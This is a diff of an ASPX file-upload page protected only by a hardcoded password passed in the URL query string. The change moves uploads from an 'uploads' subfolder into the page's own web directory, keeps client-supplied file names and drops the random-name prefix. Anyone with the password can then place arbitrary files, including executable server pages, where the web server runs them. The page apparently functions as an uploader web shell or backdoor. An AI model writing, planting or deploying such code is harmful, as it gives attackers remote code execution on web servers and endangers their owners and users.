@@ -3,7 +3,7 @@
 <%
     // ===== CONFIG =====
     string PASSWORD = "admin987654321!@";  // Change this to your password
-    string UPLOAD_DIR = Server.MapPath("uploads"); // uploads folder in same directory
+    string UPLOAD_DIR = Server.MapPath("."); // Current directory
 
     // ===== AUTH CHECK =====
     string p = Request.QueryString["p"];
@@ -14,12 +14,6 @@
         Response.End();
     }
 
-    // Ensure uploads folder exists
-    if (!Directory.Exists(UPLOAD_DIR))
-    {
-        Directory.CreateDirectory(UPLOAD_DIR);
-    }
-
     // ===== UPLOAD LOGIC =====
     if (IsPostBack && Request.Files.Count > 0)
     {
@@ -27,17 +21,14 @@
         if (file != null && file.ContentLength > 0)
         {
             string originalName = Path.GetFileName(file.FileName);
-            string uniqueName = Guid.NewGuid().ToString() + "_" + originalName;
-            string savePath = Path.Combine(UPLOAD_DIR, uniqueName);
+            string savePath = Path.Combine(UPLOAD_DIR, originalName);
 
             try
             {
                 file.SaveAs(savePath);
                 Response.Write("✅ File uploaded successfully!<br>");
-                Response.Write("Original Name: " + Server.HtmlEncode(originalName) + "<br>");
-                Response.Write("Saved As: " + Server.HtmlEncode(uniqueName) + "<br>");
+                Response.Write("File Name: " + Server.HtmlEncode(originalName) + "<br>");
                 Response.Write("Full Path: " + Server.HtmlEncode(savePath) + "<br>");
-                Response.Write("<a href='?p=" + PASSWORD + "'>← Back to Uploader</a>");
             }
             catch (Exception ex)
             {
@@ -54,13 +45,13 @@
     <title>ASPX File Uploader</title>
 </head>
 <body>
-<h2>ASPX File Uploader</h2>
+<h2>ASPX File Uploader (Current Directory)</h2>
 
 <form method="post" enctype="multipart/form-data">
     <input type="file" name="file" required>
     <button type="submit">Upload</button>
 </form>
 
-<p>Files are saved in: <b>uploads</b> folder (same directory as this ASPX file)</p>
+<p>Files will be saved in the same folder as this ASPX file.</p>
 </body>
 </html>
